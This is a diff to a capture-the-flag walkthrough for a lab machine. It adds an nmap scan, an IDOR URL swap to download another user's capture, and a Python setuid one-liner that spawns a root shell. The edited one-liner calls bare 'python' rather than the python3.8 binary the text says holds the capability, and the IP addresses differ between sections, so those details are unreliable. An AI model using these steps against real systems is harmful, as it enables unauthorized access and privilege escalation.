@@ -27,7 +27,7 @@ SSH foothold → `cap_setuid` on `python3.8` → root.
 ### Nmap
 
 ```bash
-nmap -sVC 10.129.134.144
+nmap -sV 10.129.134.144
 ```
 
 ```
@@ -59,10 +59,9 @@ captures belonging to **other users** — an Insecure Direct Object Reference
 (IDOR)-style access control flaw, where requesting another identifier returns
 a capture that should not be accessible.
 
-> **TODO (fill in exact detail):** the specific endpoint/URL used to
-> download the other user's capture (e.g. the download path and the
-> identifier that was changed), and whether any authentication was required
-> to reach it. Add this to make the foothold section fully reproducible.
+```bash
+http://10.129.134.236/data/1 --> http://10.129.134.236/data/0
+```
 
 ### Analysing the capture in Wireshark
 
@@ -178,7 +177,7 @@ binary runs.
 Using Python to drop the UID to 0 and spawn a shell:
 
 ```bash
-/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
 ```
 
 This returns a root shell, and the root flag was read:
